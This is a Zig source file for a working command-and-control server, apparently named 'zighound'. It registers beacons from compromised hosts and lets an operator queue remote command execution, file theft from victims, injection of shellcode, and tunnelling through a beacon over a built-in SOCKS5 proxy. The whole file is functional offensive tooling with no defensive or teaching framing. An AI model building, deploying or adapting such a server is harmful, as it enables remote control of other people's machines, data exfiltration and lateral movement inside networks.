// Copyright (c) 2025 il1v3y. All Rights Reserved.
// Unauthorized copying or use of this file is strictly prohibited.
// Proprietary and confidential.

const std = @import("std");
const crypto = @import("crypto.zig");
const Ui = @import("ui.zig").Ui;
const Socks5Server = @import("socks.zig").Socks5Server;
const util = @import("util.zig");
const os = if (@hasDecl(std, "posix")) std.posix else std.os;

pub const Server = struct {
    allocator: std.mem.Allocator,
    port: u16,
    key: [crypto.KeySize]u8,
    beacons: std.StringHashMap(Beacon),
    tasks: std.ArrayListUnmanaged(Task),
    socks_server: ?Socks5Server = null,
    socks_clients: std.AutoHashMap(u32, std.net.Stream),
    next_proxy_id: u32 = 1,
    mutex: std.Thread.Mutex,

    const Beacon = struct {
        id: []const u8,
        last_seen: i64,
        ip: []const u8,
        os: []const u8,
        hostname: []const u8,
    };

    const Task = struct {
        id: u64,
        type: enum { exec, download, audit, inject, proxy },
        beacon_id: []const u8,
        command: []const u8, // Used for path in download, shellcode in inject
        status: enum { queued, sent, completed, failed },
        result: ?[]const u8 = null,
    };

    pub fn init(allocator: std.mem.Allocator, port: u16, psk: []const u8) !Server {
        var key: [crypto.KeySize]u8 = undefined;
        std.crypto.hash.sha2.Sha256.hash(psk, &key, .{});

        return .{
            .allocator = allocator,
            .port = port,
            .key = key,
            .beacons = std.StringHashMap(Beacon).init(allocator),
            .tasks = .empty,
            .socks_clients = std.AutoHashMap(u32, std.net.Stream).init(allocator),
            .mutex = .{},
        };
    }

    pub fn deinit(self: *Server) void {
        var iter = self.beacons.iterator();
        while (iter.next()) |entry| {
            self.allocator.free(entry.key_ptr.*);
            self.allocator.free(entry.value_ptr.ip);
            self.allocator.free(entry.value_ptr.os);
            self.allocator.free(entry.value_ptr.hostname);
        }
        self.beacons.deinit();

        for (self.tasks.items) |task| {
            self.allocator.free(task.beacon_id);
            self.allocator.free(task.command);
            if (task.result) |res| self.allocator.free(res);
        }
        self.tasks.deinit(self.allocator);
    }

    pub fn start(self: *Server) !void {
        const address = std.net.Address.parseIp("0.0.0.0", self.port) catch unreachable;
        var server = try address.listen(.{ .reuse_address = true });
        defer server.deinit();

        const ui = Ui{ .color = true };
        const key_hex = std.fmt.bytesToHex(self.key, .lower);
        ui.info("[*] C2 Server listening on 0.0.0.0:{d} (TCP/Encrypted)\n", .{self.port});
        ui.info("[*] PSK-derived Key: {s}\n", .{&key_hex});
        ui.info("[*] Type 'help' for commands\n", .{});

        // Start SOCKS
        var socks = Socks5Server.init(self.allocator, 1080);
        try socks.listen();
        self.socks_server = socks;
        (try std.Thread.spawn(.{}, socksLoop, .{self})).detach();

        (try std.Thread.spawn(.{}, shellLoop, .{self})).detach();

        while (true) {
            const conn = try server.accept();
            (try std.Thread.spawn(.{}, handleConnection, .{ self, conn })).detach();
        }
    }

    fn shellLoop(self: *Server) !void {
        const stdin_file = std.fs.File.stdin();
        var stdin_buffer: [1024]u8 = undefined;
        var stdin_reader_state = stdin_file.reader(&stdin_buffer);
        const stdin = &stdin_reader_state.interface;

        while (true) {
            std.debug.print("zighound> ", .{});
            const line = stdin.takeDelimiterExclusive('\n') catch |err| switch (err) {
                error.EndOfStream => break,
                else => break,
            };
            const trimmed = std.mem.trim(u8, line, " \r\t");
            if (trimmed.len == 0) continue;

            if (std.mem.eql(u8, trimmed, "help")) {
                std.debug.print("Commands: help, beacons, tasks, exit\n", .{});
                std.debug.print("          exec <id> <cmd>\n", .{});
                std.debug.print("          download <id> <remote_path>\n", .{});
                std.debug.print("          audit <id>\n", .{});
                std.debug.print("          inject <id> <local_shellcode_file>\n", .{});
            } else if (std.mem.eql(u8, trimmed, "beacons")) {
                self.listBeacons();
            } else if (std.mem.eql(u8, trimmed, "tasks")) {
                self.listTasks();
            } else if (std.mem.startsWith(u8, trimmed, "exec ")) {
                var iter = std.mem.splitScalar(u8, trimmed[5..], ' ');
                const id = iter.next() orelse continue;
                const cmd = iter.rest();
                if (cmd.len == 0) continue;
                const task_id = self.queueCommand(id, cmd) catch |err| {
                    std.debug.print("Error queuing task: {}\n", .{err});
                    continue;
                };
                std.debug.print("[+] Queued exec {d} for {s}\n", .{ task_id, id });
            } else if (std.mem.startsWith(u8, trimmed, "download ")) {
                var iter = std.mem.splitScalar(u8, trimmed[9..], ' ');
                const id = iter.next() orelse continue;
                const path = iter.rest();
                if (path.len == 0) continue;
                const task_id = self.queueDownload(id, path) catch |err| {
                    std.debug.print("Error queuing download: {}\n", .{err});
                    continue;
                };
                std.debug.print("[+] Queued download {d} for {s}\n", .{ task_id, id });
            } else if (std.mem.startsWith(u8, trimmed, "audit ")) {
                const id = std.mem.trim(u8, trimmed[6..], " ");
                const task_id = self.queueAudit(id) catch |err| {
                    std.debug.print("Error queuing audit: {}\n", .{err});
                    continue;
                };
                std.debug.print("[+] Queued audit {d} for {s}\n", .{ task_id, id });
            } else if (std.mem.startsWith(u8, trimmed, "inject ")) {
                var iter = std.mem.splitScalar(u8, trimmed[7..], ' ');
                const id = iter.next() orelse continue;
                const path = iter.rest();
                if (path.len == 0) continue;
                
                const sc = std.fs.cwd().readFileAlloc(self.allocator, path, 10 * 1024 * 1024) catch |err| {
                    std.debug.print("Error reading shellcode file: {}\n", .{err});
                    continue;
                };
                defer self.allocator.free(sc);

                const task_id = self.queueInject(id, sc) catch |err| {
                    std.debug.print("Error queuing inject: {}\n", .{err});
                    continue;
                };
                std.debug.print("[+] Queued inject {d} for {s}\n", .{ task_id, id });
            } else if (std.mem.eql(u8, trimmed, "exit")) {
                std.process.exit(0);
            } else {
                std.debug.print("Unknown command: {s}\n", .{trimmed});
            }
        }
    }

    pub fn listBeacons(self: *Server) void {
        self.mutex.lock();
        defer self.mutex.unlock();
        var iter = self.beacons.iterator();
        std.debug.print("\n--- Beacons ---\n", .{});
        while (iter.next()) |entry| {
            const b = entry.value_ptr;
            std.debug.print("{s} | {s} | {s} | {d}\n", .{ b.id, b.os, b.ip, b.last_seen });
        }
        std.debug.print("---------------\n", .{});
    }

    pub fn listTasks(self: *Server) void {
        self.mutex.lock();
        defer self.mutex.unlock();
        std.debug.print("\n--- Tasks ---\n", .{});
        for (self.tasks.items) |t| {
            std.debug.print("{d} | {s} | {s} | {s}\n", .{ t.id, t.beacon_id, @tagName(t.status), @tagName(t.type) });
            if (t.result) |res| {
                if (res.len > 100) {
                    std.debug.print("  Result: {s}...\n", .{res[0..100]});
                } else {
                    std.debug.print("  Result: {s}\n", .{res});
                }
            }
        }
        std.debug.print("-------------\n", .{});
    }

    fn handleConnection(self: *Server, conn: std.net.Server.Connection) !void {
        defer conn.stream.close();
        var read_buffer: [4096]u8 = undefined;
        var write_buffer: [4096]u8 = undefined;
        var reader_state = conn.stream.reader(&read_buffer);
        var writer_state = conn.stream.writer(&write_buffer);
        const reader = reader_state.interface();
        const writer = &writer_state.interface;

        while (true) {
            // Read length (4 bytes)
            const len = reader.takeInt(u32, .little) catch break;
            if (len > 1_048_576) break; // Max 1MB

            const encrypted = self.allocator.alloc(u8, len) catch break;
            defer self.allocator.free(encrypted);
            reader.readSliceAll(encrypted) catch break;

            const decrypted = crypto.decrypt(self.allocator, self.key, encrypted) catch break;
            defer self.allocator.free(decrypted);

            const response = self.processMessage(decrypted, conn.address) catch |err| {
                std.debug.print("Error processing message: {}\n", .{err});
                break;
            };
            defer if (response) |r| self.allocator.free(r);

            if (response) |r| {
                const enc_resp = crypto.encrypt(self.allocator, self.key, r) catch break;
                defer self.allocator.free(enc_resp);

                try writer.writeInt(u32, @as(u32, @intCast(enc_resp.len)), .little);
                try writer.writeAll(enc_resp);
            } else {
                // Send zero length if no response
                try writer.writeInt(u32, 0, .little);
            }
        }
    }

    fn processMessage(self: *Server, message: []const u8, addr: std.net.Address) !?[]u8 {
        const parsed = try std.json.parseFromSlice(std.json.Value, self.allocator, message, .{});
        defer parsed.deinit();

        const root = parsed.value.object;
        const type_val = root.get("type") orelse return error.MissingType;
        const msg_type = type_val.string;

        if (std.mem.eql(u8, msg_type, "ping")) {
            return try self.handlePing(root, addr);
        } else if (std.mem.eql(u8, msg_type, "get_task")) {
            return try self.handleGetTask(root);
        } else if (std.mem.eql(u8, msg_type, "output")) {
            return try self.handleOutput(root);
        } else if (std.mem.eql(u8, msg_type, "file")) {
            return try self.handleFile(root);
        }

        return null;
    }

    fn handlePing(self: *Server, root: std.json.ObjectMap, addr: std.net.Address) !?[]u8 {
        const id = root.get("id").?.string;
        const os_name = root.get("os").?.string;
        const hostname = root.get("hostname").?.string;

        self.mutex.lock();
        defer self.mutex.unlock();

        if (self.beacons.getEntry(id)) |entry| {
            entry.value_ptr.last_seen = std.time.milliTimestamp();
        } else {
            const id_dup = try self.allocator.dupe(u8, id);
            var ip_buf: [64]u8 = undefined;
            const ip_str = try std.fmt.bufPrint(&ip_buf, "{f}", .{addr});
            try self.beacons.put(id_dup, .{
                .id = id_dup,
                .last_seen = std.time.milliTimestamp(),
                .ip = try self.allocator.dupe(u8, ip_str),
                .os = try self.allocator.dupe(u8, os_name),
                .hostname = try self.allocator.dupe(u8, hostname),
            });
            std.debug.print("[+] New Beacon Registered: {s} ({s}@{s} from {s})\n", .{ id, os_name, hostname, ip_str });
        }

        return try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(.{ .status = "ok" }, .{})});
    }

    fn handleGetTask(self: *Server, root: std.json.ObjectMap) !?[]u8 {
        const beacon_id = root.get("id").?.string;

        self.mutex.lock();
        defer self.mutex.unlock();

        var found_task: ?*Task = null;
        for (self.tasks.items) |*task| {
            if (std.mem.eql(u8, task.beacon_id, beacon_id) and task.status == .queued) {
                found_task = task;
                break;
            }
        }

        if (found_task) |task| {
            task.status = .sent;
            if (task.type == .exec) {
                return try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(.{
                    .type = "task",
                    .id = task.id,
                    .command = task.command,
                }, .{})});
            } else if (task.type == .download) {
                return try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(.{
                    .type = "download",
                    .id = task.id,
                    .path = task.command,
                }, .{})});
            } else if (task.type == .audit) {
                return try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(.{
                    .type = "audit",
                    .id = task.id,
                }, .{})});
            } else if (task.type == .inject) {
                return try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(.{
                    .type = "inject",
                    .id = task.id,
                    .data = task.command,
                }, .{})});
            } else if (task.type == .proxy) {
                // Command is already JSON: { subtype: ..., ... }
                // We wrap it? No, we pass it raw? Or we include it in data?
                // Protocol expects 'type', 'id'.
                // Let's use: type="proxy", id=..., command=... (where command is the inner JSON)
                return try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(.{
                    .type = "proxy",
                    .id = task.id,
                    .command = task.command,
                }, .{})});
            }
        }

        return try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(.{ .type = "no_task" }, .{})});
    }

    fn handleFile(self: *Server, root: std.json.ObjectMap) !?[]u8 {
        const task_id = @as(u64, @intCast(root.get("task_id").?.integer));
        const success = root.get("success").?.bool;
        const filename = root.get("filename").?.string;
        const data_b64 = root.get("data").?.string;

        self.mutex.lock();
        defer self.mutex.unlock();

        var task_ptr: ?*Task = null;
        var beacon_id: []const u8 = "unknown";
        for (self.tasks.items) |*task| {
            if (task.id == task_id) {
                task_ptr = task;
                beacon_id = task.beacon_id;
                break;
            }
        }

        if (success) {
            const decoder = std.base64.standard.Decoder;
            const decoded_len = try decoder.calcSizeForSlice(data_b64);
            const decoded = try self.allocator.alloc(u8, decoded_len);
            defer self.allocator.free(decoded);
            try decoder.decode(decoded, data_b64);

            std.fs.cwd().makeDir("downloads") catch |err| {
                if (err != error.PathAlreadyExists) return err;
            };

            const local_name = try std.fmt.allocPrint(self.allocator, "downloads/{s}_{s}", .{ beacon_id, filename });
            defer self.allocator.free(local_name);

            const file = try std.fs.cwd().createFile(local_name, .{});
            defer file.close();
            try file.writeAll(decoded);

            std.debug.print("[+] File received: {s} ({d} bytes)\n", .{ local_name, decoded.len });
            if (task_ptr) |t| {
                t.status = .completed;
                t.result = try std.fmt.allocPrint(self.allocator, "Downloaded to {s}", .{local_name});
            }
        } else {
            std.debug.print("[-] File download failed for task {d}\n", .{ task_id });
            if (task_ptr) |t| {
                t.status = .failed;
                t.result = try self.allocator.dupe(u8, data_b64);
            }
        }

        return try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(.{ .status = "ok" }, .{})});
    }

    fn handleOutput(self: *Server, root: std.json.ObjectMap) !?[]u8 {
        const task_id = @as(u64, @intCast(root.get("task_id").?.integer));
        const output = root.get("output").?.string;
        const success = root.get("success").?.bool;

        self.mutex.lock();
        defer self.mutex.unlock();

        for (self.tasks.items) |*task| {
            if (task.id == task_id) {
                task.status = if (success) .completed else .failed;
                task.result = try self.allocator.dupe(u8, output);
                std.debug.print("[*] Task {d} result received from {s}\n", .{ task_id, task.beacon_id });
                break;
            }
        }

        return try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(.{ .status = "ok" }, .{})});
    }

    pub fn queueCommand(self: *Server, beacon_id: []const u8, command: []const u8) !u64 {
        self.mutex.lock();
        defer self.mutex.unlock();

        const id = @as(u64, @intCast(self.tasks.items.len + 1));
        try self.tasks.append(self.allocator, .{
            .id = id,
            .type = .exec,
            .beacon_id = try self.allocator.dupe(u8, beacon_id),
            .command = try self.allocator.dupe(u8, command),
            .status = .queued,
        });
        return id;
    }

    pub fn queueDownload(self: *Server, beacon_id: []const u8, path: []const u8) !u64 {
        self.mutex.lock();
        defer self.mutex.unlock();

        const id = @as(u64, @intCast(self.tasks.items.len + 1));
        try self.tasks.append(self.allocator, .{
            .id = id,
            .type = .download,
            .beacon_id = try self.allocator.dupe(u8, beacon_id),
            .command = try self.allocator.dupe(u8, path),
            .status = .queued,
        });
        return id;
    }

    pub fn queueAudit(self: *Server, beacon_id: []const u8) !u64 {
        self.mutex.lock();
        defer self.mutex.unlock();

        const id = @as(u64, @intCast(self.tasks.items.len + 1));
        try self.tasks.append(self.allocator, .{
            .id = id,
            .type = .audit,
            .beacon_id = try self.allocator.dupe(u8, beacon_id),
            .command = try self.allocator.dupe(u8, "audit"),
            .status = .queued,
        });
        return id;
    }

    pub fn queueInject(self: *Server, beacon_id: []const u8, shellcode: []const u8) !u64 {
        self.mutex.lock();
        defer self.mutex.unlock();

        const encoder = std.base64.standard.Encoder;
        const b64_len = encoder.calcSize(shellcode.len);
        const b64_data = try self.allocator.alloc(u8, b64_len);
        _ = encoder.encode(b64_data, shellcode);
        
        const id = @as(u64, @intCast(self.tasks.items.len + 1));
        try self.tasks.append(self.allocator, .{
            .id = id,
            .type = .inject,
            .beacon_id = try self.allocator.dupe(u8, beacon_id),
            .command = b64_data, 
            .status = .queued,
        });
        return id;
    }

    fn socksLoop(self: *Server) !void {
        while (true) {
            if (self.socks_server) |*s| {
                const conn = s.accept() catch {
                    util.sleep(100 * 1_000_000);
                    continue;
                };
                if (std.Thread.spawn(.{}, handleSocksClient, .{ self, conn })) |thread| {
                    thread.detach();
                } else |_| {
                    conn.stream.close();
                }
            } else {
                util.sleep(1 * 1_000_000_000);
            }
        }
    }

    fn handleSocksClient(self: *Server, conn: std.net.Server.Connection) void {
        var rb: [4096]u8 = undefined;
        var wb: [4096]u8 = undefined;
        var r_state = conn.stream.reader(&rb);
        var w_state = conn.stream.writer(&wb);
        const reader = r_state.interface();
        const writer = &w_state.interface;

        Socks5Server.handleHandshake(reader, writer) catch return;
        const req = Socks5Server.handleRequest(self.allocator, reader, writer) catch return;

        self.mutex.lock();
        const id = self.next_proxy_id;
        self.next_proxy_id += 1;
        self.socks_clients.put(id, conn.stream) catch {
            self.mutex.unlock();
            return;
        };
        
        var beacon_id: []const u8 = "";
        var iter = self.beacons.keyIterator();
        if (iter.next()) |k| {
            beacon_id = self.allocator.dupe(u8, k.*) catch ""; 
        }
        self.mutex.unlock();

        if (beacon_id.len == 0) {
            conn.stream.close();
            return;
        }
        defer self.allocator.free(beacon_id);

        var host_buf: [256]u8 = undefined;
        // addr is std.net.Address. format is 1.2.3.4:80
        const host_str = std.fmt.bufPrint(&host_buf, "{f}", .{req.addr}) catch return;
        
        self.queueProxyConnect(beacon_id, id, host_str) catch return;

        var buf: [4096]u8 = undefined;
        while (true) {
            const len = reader.readSliceShort(&buf) catch break;
            if (len == 0) break;
            self.queueProxyWrite(beacon_id, id, buf[0..len]) catch break;
        }

        self.mutex.lock();
        _ = self.socks_clients.remove(id);
        self.mutex.unlock();
        conn.stream.close();
    }

    pub fn queueProxyConnect(self: *Server, beacon_id: []const u8, id: u32, target: []const u8) !void {
        const payload = .{ .subtype = "connect", .id = id, .target = target };
        const cmd = try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(payload, .{})});
        
        self.mutex.lock();
        defer self.mutex.unlock();
        const tid = @as(u64, @intCast(self.tasks.items.len + 1));
        try self.tasks.append(self.allocator, .{
            .id = tid,
            .type = .proxy,
            .beacon_id = try self.allocator.dupe(u8, beacon_id),
            .command = cmd,
            .status = .queued,
        });
    }

    pub fn queueProxyWrite(self: *Server, beacon_id: []const u8, id: u32, data: []const u8) !void {
        const encoder = std.base64.standard.Encoder;
        const b64_len = encoder.calcSize(data.len);
        const b64 = try self.allocator.alloc(u8, b64_len);
        _ = encoder.encode(b64, data);
        // command takes ownership of b64 string if we format it right? 
        // No, json fmt prints it. We need to free b64.
        
        const payload = .{ .subtype = "write", .id = id, .data = b64 };
        const cmd = try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(payload, .{})});
        self.allocator.free(b64);

        self.mutex.lock();
        defer self.mutex.unlock();
        const tid = @as(u64, @intCast(self.tasks.items.len + 1));
        try self.tasks.append(self.allocator, .{
            .id = tid,
            .type = .proxy,
            .beacon_id = try self.allocator.dupe(u8, beacon_id),
            .command = cmd,
            .status = .queued,
        });
    }
};
 
